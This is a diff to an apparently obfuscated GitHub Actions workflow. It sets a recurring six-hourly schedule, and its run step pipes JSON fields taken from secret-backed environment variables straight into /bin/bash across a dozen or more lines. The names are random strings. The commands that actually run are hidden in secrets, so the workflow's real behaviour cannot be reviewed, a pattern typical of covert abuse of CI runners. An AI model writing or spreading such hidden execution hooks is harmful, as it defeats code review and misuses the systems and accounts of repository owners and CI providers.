@@ -3,8 +3,7 @@ name: luoshantou8765
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 4/6 * * *'
-
+    - cron: '15 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,9 +12,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: luoshantou8765
         env:
-          cev64724: ${{ secrets.cev64724 }}
+          bevy26: ${{ secrets.bevy26 }}
         run: |
-          echo $cev64724 | jq -r .hwbp695 | /bin/bash
-          echo $q9895 | jq -r .ikp202 | /bin/bash
-          echo $gf0 | jq -r .qszz589 | /bin/bash
+          echo $bevy26 | jq -r .zoyhy6561 | /bin/bash
+          echo $yl1 | jq -r .rpegd06 | /bin/bash
+          echo $q7 | jq -r .c8 | /bin/bash
+          echo $c26256 | jq -r .ryog21 | /bin/bash
+          echo $woqb93 | jq -r .rv662 | /bin/bash
+          echo $zbulj6 | jq -r .m07 | /bin/bash
+          echo $d7 | jq -r .zzk7 | /bin/bash
+          echo $wpot875 | jq -r .k0 | /bin/bash
+          echo $jygrx149 | jq -r .ranp9220 | /bin/bash
+          echo $lzc145 | jq -r .ieojq16018 | /bin/bash
+          echo $vgfpt321 | jq -r .paqm0218 | /bin/bash
+          echo $hyyw195 | jq -r .gvu52717 | /bin/bash
+          echo $bh8 | jq -r .lrk35 | /bin/bash
+          echo $ozssl20 | jq -r .extfp152 | /bin/bash
+          echo $ky6 | jq -r .ndzfh0 | /bin/bash
 
